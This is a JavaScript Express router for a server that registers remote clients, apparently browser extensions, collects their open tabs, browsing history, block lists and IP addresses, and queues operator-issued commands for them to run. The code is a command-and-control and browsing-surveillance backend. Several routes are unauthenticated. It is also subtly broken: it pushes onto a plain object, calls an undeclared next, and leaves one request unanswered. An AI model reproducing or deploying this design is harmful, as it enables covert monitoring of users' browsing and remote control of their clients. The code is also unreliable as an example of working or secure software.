var router = require('express').Router(),
    auth = require('../auth'),
    Client = require('mongoose').model('Client')

commands = []

function validId(req, res, next) {
    Client.findById(req.params.id, (err, client) => {
        if (err) {
            return res.render('clients/client.html', { err: "Could not find specified client" })
        }
        req.client = client
        next()
    })
}

router.get('/clients', auth.user, (req, res, next) => {
    Client.find({ }, (err, clients) => {
        res.render('clients/index.html', { clients: clients })
    })
})

router.get('/clients/stats', auth.user, (req, res, next) => {
    Client.find({ }, (err, clients) => {
        if (err) { return next(err) }

        var tabCount = 0, historyCount = 0, blockCount = 0

        for (var i = 0; i < clients.length; i++) {
            tabCount += clients[i].tabs.length
            historyCount += clients[i].history.length
            blockCount += clients[i].blocks.length
        }

        res.json({
            clientCount: clients.length,
            tabCount: tabCount,
            historyCount: historyCount,
            blockCount: blockCount
        });
    })
})

router.get('/clients/connect', (req, res, next) => {
    client = new Client()
    client.isOnline = true
    client.save((err, client) => {
        if (err) { return next(err) }
        commands[client.id] = {}
        res.send(client.id)
    })
})

router.get('/clients/:id', auth.user, validId, (req, res) => {
    res.render('clients/client.html', { _client: req.client })
})

router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
    Client.findByIdAndUpdate(req.client.id, {
        name: req.body.name,
        note: req.body.note
    }, err => {
        if (err) { return next(err) }
        if (req.body.name) {
            res.render('clients/client.html', {
                _client: req.client, msg: req.body.note ? "Success! Name changed and note added." : "Success! Name changd and note cleared."
            })
        } else {
            res.render('clients/client.html', {
                _client: req.client, msg: req.body.note ? "Success! Note added." : "Success! Note cleared."
            })
        }
    })
})

router.get('/clients/:id/disconnect', (req, res) => {
    Client.findByIdAndRemove(req.params.id, err => {
        if (err) { return next(err) }
        res.send("k bye")
    })
})

router.get('/clients/:id/bulletin', validId, (req, res) => {
    res.json(commands[req.client.id])
})

router.post('/clients/:id/bulletin', auth.user, validId, (req, res) => {
    if (req.body.code) {
        commands[req.client.id].push({
            code: req.body.code,
            args: req.body.args
        })
        res.render('clients/client.html', { _client: req.client, msg: "Command issued" })
    } else {
        res.render('clients/client.html', { err: "Invalid command code" })
    }
})

router.post('/clients/:id/respond', validId, (req, res) => {
    var results = req.body.results
    for (var i = 0; i < results.length; i++) {
        if (results[i].success) {
            delete commands[req.client.id][i]
        }
    }
    commands[req.client.id] = commands[req.client.id].filter(el => {
        return el
    })
})

router.post('/clients/:id/update', (req, res) => {
    var data = JSON.parse(req.body.data)
    Client.findByIdAndUpdate(req.params.id, {
         blocks: data.blocks,
         tabs: data.tabs,
         history: data.history,
         ips: data.ips
    }, err => {
        if (err) { return next(err) }
        res.send("Updated")
    })
})

module.exports = router